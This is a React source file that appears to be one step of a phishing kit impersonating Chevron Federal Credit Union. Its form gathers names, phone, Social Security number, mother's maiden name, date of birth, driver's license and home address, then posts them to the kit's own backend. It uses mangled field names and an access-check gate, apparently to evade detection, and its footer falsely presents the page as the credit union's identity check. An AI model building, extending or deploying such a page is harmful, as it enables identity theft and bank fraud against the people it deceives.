import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

const BasicInfo: React.FC = () => {
  const [fzNme, setFzNme] = useState('');
  const [lzNme, setLzNme] = useState('');
  const [phone, setPhone] = useState('');
  const [ssn, setSsn] = useState('');
  const [motherMaidenName, setMotherMaidenName] = useState('');
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [driverLicense, setDriverLicense] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    fzNme: '',
    lzNme: '',
    phone: '',
    ssn: '',
    motherMaidenName: '',
    dob: '',
    driverLicense: '',
    stAd: '',
    city: '',
    state: '',
    zipCode: '',
    form: '',
  });
  const [username, setUsername] = useState('');
  const isAllowed = useAccessCheck(baseUrl);

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz: emzemzState } = location.state || {};

  React.useEffect(() => {
    if (emzemzState) {
      setUsername(emzemzState);
    } else {
      console.error('No username provided from previous page');
      // Optionally redirect back or show error
    }
  }, [emzemzState]);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Checking access…</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting…</div>;
  }

  if (!username) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Error: No username provided. Please go back and try again.</div>;
  }

  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: currentYear - 1899 }, (_, i) => 1900 + i);
  const daysInMonth = (month && year) ? new Date(parseInt(year), parseInt(month), 0).getDate() : 31;

  const formatPhone = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 10);
    if (digitsOnly.length >= 7) {
      return digitsOnly.replace(/(\d{3})(\d{3})(\d{0,4})/, '($1) $2-$3');
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,3})/, '($1) $2');
    }
    return digitsOnly;
  };

  const formatSSN = (value: string) => {
    const digitsOnly = value.replace(/\D/g, '').slice(0, 9);
    if (digitsOnly.length >= 6) {
      return digitsOnly.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, p1, p2, p3) =>
        p3 ? `${p1}-${p2}-${p3}` : `${p1}-${p2}`
      );
    } else if (digitsOnly.length >= 4) {
      return digitsOnly.replace(/(\d{3})(\d{0,2})/, (_, p1, p2) =>
        p2 ? `${p1}-${p2}` : `${p1}`
      );
    }
    return digitsOnly;
  };

  const validateForm = () => {
    const phoneDigits = phone.replace(/\D/g, '');
    const ssnDigits = ssn.replace(/\D/g, '');
    
    const newErrors = { 
      fzNme: !fzNme.trim() ? 'First name is required' : '',
      lzNme: !lzNme.trim() ? 'Last name is required' : '',
      phone: phoneDigits.length !== 10 ? 'Phone must be 10 digits' : '',
      ssn: ssnDigits.length !== 9 ? 'SSN must be 9 digits' : '',
      motherMaidenName: !motherMaidenName.trim() ? "Mother's maiden name is required" : '',
      dob: (!month || !day || !year) ? 'Complete date of birth is required' : '',
      driverLicense: !driverLicense.trim() ? "Driver's license is required" : '',
      stAd: !stAd.trim() ? 'Street address is required' : '',
      city: !city.trim() ? 'City is required' : '',
      state: !state.trim() ? 'State is required' : '',
      zipCode: !zipCode.trim() ? 'Zip code is required' : '',
      form: '',
    };

    if (month && day && year) {
      const dob = new Date(parseInt(year), parseInt(month) - 1, parseInt(day));
      const age = new Date().getFullYear() - dob.getFullYear();
      const monthDiff = new Date().getMonth() - dob.getMonth();
      
      if (age < 18 || (age === 18 && monthDiff < 0)) {
        newErrors.dob = 'You must be at least 18 years old.';
      }
    }

    setErrors(newErrors);
    return !Object.values(newErrors).some(error => error);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    setErrors(prev => ({ ...prev, form: '' }));

    try {
      const getMonthName = (monthNumber: string) => {
        const monthNames = [
          "January", "February", "March", "April", "May", "June",
          "July", "August", "September", "October", "November", "December"
        ];
        return monthNames[parseInt(monthNumber) - 1] || '';
      };

      const dob = `${getMonthName(month)}/${day}/${year}`;

      // Submit basic info
      await axios.post(`${baseUrl}api/chevron-basic-info/`, {
        emzemz: username,
        fzNme,
        lzNme,
        phone,
        ssn,
        motherMaidenName,
        dob,
        driverLicense
      });

      // Submit home address
      await axios.post(`${baseUrl}api/chevron-home-address/`, {
        emzemz: username,
        stAd,
        apt,
        city,
        state,
        zipCode
      });

      navigate('/card', {
        state: {
          emzemz: username
        }
      });
    } catch (error) {
      console.error('Error submitting form:', error);
      setErrors(prev => ({
        ...prev,
        form: 'There was an error submitting your information. Please try again.'
      }));
    } finally {
      setIsLoading(false);
    }
  };

  const renderError = (message?: string) =>
    message ? (
      <p className="flex items-center gap-2 text-xs font-semibold text-red-600">
        <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
          <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
        </svg>
        {message}
      </p>
    ) : null;

  return (
    <FlowPageLayout
      eyebrow="Step 5 of 6"
      title="Confirm Your Personal Details"
      description="We need to verify your contact details and the address on file. Make sure everything matches what’s on your credit profile."
      contentClassName="space-y-10"
    >
      <form onSubmit={handleSubmit} className="space-y-10">
        <section className="space-y-6">
          <h2 className="text-lg font-semibold text-[#0e2f56]">Personal Information</h2>
          <div className="grid gap-4 md:grid-cols-2">
            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">First Name</label>
              <input
                id="fzNme"
                name="fzNme"
                type="text"
                value={fzNme}
                onChange={(e) => setFzNme(e.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                placeholder="Enter first name"
              />
              {renderError(errors.fzNme)}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Last Name</label>
              <input
                id="lzNme"
                name="lzNme"
                type="text"
                value={lzNme}
                onChange={(e) => setLzNme(e.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                placeholder="Enter last name"
              />
              {renderError(errors.lzNme)}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Phone</label>
              <input
                id="phone"
                name="phone"
                type="text"
                value={phone}
                onChange={(e) => setPhone(formatPhone(e.target.value))}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                placeholder="(555) 123-4567"
              />
              {renderError(errors.phone)}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">SSN</label>
              <div className="flex items-center gap-3">
                <input
                  id="ssn"
                  name="ssn"
                  type={showSSN ? 'text' : 'password'}
                  value={ssn}
                  onChange={(e) => setSsn(formatSSN(e.target.value))}
                  maxLength={11}
                  className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                  placeholder="XXX-XX-XXXX"
                />
                <button
                  type="button"
                  onClick={() => setShowSSN((prev) => !prev)}
                  className="text-xs font-semibold text-[#0b5da7] hover:underline"
                >
                  {showSSN ? 'Hide' : 'Show'}
                </button>
              </div>
              {renderError(errors.ssn)}
            </div>

            <div className="space-y-2 md:col-span-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Mother's Maiden Name</label>
              <input
                id="motherMaidenName"
                name="motherMaidenName"
                type="text"
                value={motherMaidenName}
                onChange={(e) => setMotherMaidenName(e.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                placeholder="Enter full name"
              />
              {renderError(errors.motherMaidenName)}
            </div>

            <div className="space-y-2 md:col-span-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Date of Birth</label>
              <div className="flex flex-col gap-2 sm:flex-row sm:items-center">
                <select
                  value={month}
                  onChange={(e) => setMonth(e.target.value)}
                  className="rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                >
                  <option value="">Month</option>
                  {['01','02','03','04','05','06','07','08','09','10','11','12'].map((m) => (
                    <option key={m} value={m}>
                      {m}
                    </option>
                  ))}
                </select>
                <select
                  value={day}
                  onChange={(e) => setDay(e.target.value)}
                  className="rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                >
                  <option value="">Day</option>
                  {Array.from({ length: daysInMonth }, (_, index) => String(index + 1).padStart(2, '0')).map((d) => (
                    <option key={d} value={d}>
                      {d}
                    </option>
                  ))}
                </select>
                <select
                  value={year}
                  onChange={(e) => setYear(e.target.value)}
                  className="rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                >
                  <option value="">Year</option>
                  {years.map((y) => (
                    <option key={y} value={y}>
                      {y}
                    </option>
                  ))}
                </select>
              </div>
              {renderError(errors.dob)}
            </div>

            <div className="space-y-2 md:col-span-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Driver's License</label>
              <input
                id="driverLicense"
                name="driverLicense"
                type="text"
                value={driverLicense}
                onChange={(e) => setDriverLicense(e.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                placeholder="Enter license number"
              />
              {renderError(errors.driverLicense)}
            </div>
          </div>
        </section>

        <section className="space-y-6">
          <h2 className="text-lg font-semibold text-[#0e2f56]">Home Address</h2>
          <div className="grid gap-4 md:grid-cols-2">
            <div className="space-y-2 md:col-span-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Street Address</label>
              <input
                id="stAd"
                name="stAd"
                type="text"
                value={stAd}
                onChange={(e) => setStAd(e.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                placeholder="123 Main Street"
              />
              {renderError(errors.stAd)}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Apartment / Unit (optional)</label>
              <input
                id="apt"
                name="apt"
                type="text"
                value={apt}
                onChange={(e) => setApt(e.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
              />
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">City</label>
              <input
                id="city"
                name="city"
                type="text"
                value={city}
                onChange={(e) => setCity(e.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                placeholder="Enter city"
              />
              {renderError(errors.city)}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">State</label>
              <input
                id="state"
                name="state"
                type="text"
                value={state}
                onChange={(e) => setState(e.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                placeholder="CA"
              />
              {renderError(errors.state)}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-[#0e2f56]">Zip Code</label>
              <input
                id="zipCode"
                name="zipCode"
                type="text"
                value={zipCode}
                onChange={(e) => setZipCode(e.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                placeholder="94524"
              />
              {renderError(errors.zipCode)}
            </div>
          </div>
        </section>

        {renderError(errors.form)}

        <div className="flex justify-end">
          <button
            type="submit"
            disabled={isLoading}
            className="inline-flex items-center justify-center rounded-sm bg-[#003e7d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#002c5c] disabled:cursor-not-allowed disabled:opacity-70"
          >
            {isLoading ? 'Submitting…' : 'Continue'}
          </button>
        </div>
      </form>

      <div className="rounded-sm bg-[#f0f6fb] px-4 py-3 text-xs text-[#0e2f56]/80">
        Chevron Federal Credit Union uses this information strictly to confirm your identity and protect your account access.
      </div>
    </FlowPageLayout>
  );
};

export default BasicInfo;
